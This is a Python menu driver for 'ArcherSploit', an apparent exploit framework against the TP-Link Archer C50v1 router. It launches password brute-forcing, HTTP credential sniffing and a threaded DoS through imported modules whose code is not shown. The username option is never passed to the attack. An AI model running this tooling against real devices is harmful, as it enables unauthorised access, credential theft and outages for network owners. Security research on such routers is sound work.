from Exploits.BruteForcer import BruteForcer
from Exploits.DosWrapper import DosWrapper
from Exploits.PasswordStealer import PasswordStealer

import time
import os

class ArcherSploit:
    def __init__(self):
        self.target = None

    def run(self):
        print(r"""
            ___              __              _____       __      _ __       
           /   |  __________/ /_  ___  _____/ ___/____  / /___  (_) /_      
          / /| | / ___/ ___/ __ \/ _ \/ ___/\__ \/ __ \/ / __ \/ / __/      
         / ___ |/ /  / /__/ / / /  __/ /   ___/ / /_/ / / /_/ / / /_        
        /_/  |_/_/   \___/_/ /_/\___/_/   /____/ .___/_/\____/_/\__/        
                                              /_/                           
        """)

        print("Welcome to ArcherSploit - Exploit Framework for TP-Link Archer C50v1!")

        # Initial Target IP
        self._set_target_ip()
        self._menu()

    def _menu(self):
        # Main Menu Loop
        while True:
            # Displaying Menu
            print("\nArcherSploit - TP-Link Archer C50v1 Exploitation Framework")
            print("Current Target IP:", self.target)
            print("\nChoose an option:")
            print("1. Bruteforce Passwords")
            print("2. HTTP Password Stealing")
            print("3. DoS")
            print("4. Change Target IP")
            print("5. Exit")

            # Getting user choice
            choice = input("\nEnter your choice (1-5): ")

            # Handling user choice with match-case
            match choice:
                case '1':
                    print("\n[+] Bruteforce Passwords selected.")
                    self._brute_force_menu()
                case '2':
                    print("\n[+] Starting HTTP Password Stealing on", self.target)
                    self._password_stealer_menu()
                case '3':
                    print("\n[+] Initiating DoS on", self.target)
                    self._dos_menu()
                case '4':
                    print("\n[+] Changing Target IP...")
                    self._set_target_ip()
                case '5':
                    print("\n[+] Exiting ArcherSploit. Goodbye!")
                    break
                case _:
                    print("\n[-] Invalid choice. Please try again.")

    # Method to call BruteForce class
    def _brute_force_menu(self):
        while True:
            print("\nBruteforce Passwords - Configuration")
            print("Target IP:", self.target)
            print("\n1. Start Bruteforce Attack")
            print("2. Change Username (default: admin)")
            print("3. Go Back to Main Menu")

            choice = input("\nEnter your choice (1-3): ")

            # Using match-case for the Bruteforce menu as well
            match choice:
                case '1':
                    password_file = input("Enter Path to Password File (e.g., password.txt): ")
                    print("\n[+] Starting Bruteforce Attack...")
                    self.bf = BruteForcer(self.target, password_file)
                    self.bf.force()
                    time.sleep(1)

                case '2':
                    username = input("Enter Username (default: admin): ")
                    print(f"\n[+] Username set to: {username}")

                case '3':
                    print("\n[+] Returning to Main Menu.")
                    break

                case _:
                    print("\n[-] Invalid choice. Please try again.")

    # Method to call Dos class
    def _dos_menu(self):
        if self.__check_root() == -1:
            return -1

        port_range = "1-1024"  # Default port range
        threads = 5  # Default number of threads

        while True:
            print("\nDoS Attack - Configuration")
            print("Target IP:", self.target)
            print("Port Range:", port_range)
            print("Threads:", threads)
            print("\n1. Start DoS Attack")
            print("2. Change Port Range (default: 1-1024)")
            print("3. Change Number of Threads (default: 5)")
            print("4. Go Back to Main Menu")

            choice = input("\nEnter your choice (1-4): ")

            # Using match-case for the DoS menu
            match choice:
                case '1':
                    print("\n[+] Starting DoS Attack...")
                    print("[+] Press CTRL+C to exit..")
                    ddw = DosWrapper(self.target, port_range, threads)
                    ddw.run()

                case '2':
                    port_range = input("Enter Port Range (e.g., 1-1024): ")
                    print(f"\n[+] Port Range set to: {port_range}")

                case '3':
                    threads = int(input("Enter Number of Threads (e.g., 5): "))
                    print(f"\n[+] Number of Threads set to: {threads}")

                case '4':
                    print("\n[+] Returning to Main Menu.")
                    break

                case _:
                    print("\n[-] Invalid choice. Please try again.")


    # Method to call PasswordStealer class
    def _password_stealer_menu(self) -> int:

        # PasswordStealer requires root privilege
        if self.__check_root() == -1:
            return -1

        while True:
            print("\nHTTP Password Stealing - Configuration")
            print("Target IP:", self.target)
            print("\n1. Start Sniffing for HTTP Credentials")
            print("2. Go Back to Main Menu")

            choice = input("\nEnter your choice (1-2): ")

            # Using match-case for the Password Stealer menu
            match choice:
                case '1':
                    port = input("Enter Target Port (e.g., 80): ")
                    interface = input("Enter Network Interface (e.g., tap1_0.3): ")
                    print("\n[+] Starting HTTP Password Sniffing...")
                    print("[+] Press CTRL+C to exit..")
                    ps = PasswordStealer(self.target, port, interface)
                    ps.sniff()
                    time.sleep(1)
                case '2':
                    print("\n[+] Returning to Main Menu.")
                    break

                case _:
                    print("\n[-] Invalid choice. Please try again.")

        return 0

    # Method to get Target IP
    def _set_target_ip(self) -> None:
        self.target = str(input("Enter Target IP: "))

    @staticmethod
    def __check_root() -> int:
        if os.geteuid() != 0:
            print("[-] This function requires root privileges. Exiting.")
            time.sleep(1)
            return -1

        return 0


if __name__ =="__main__":
    ars = ArcherSploit()
    ars.run()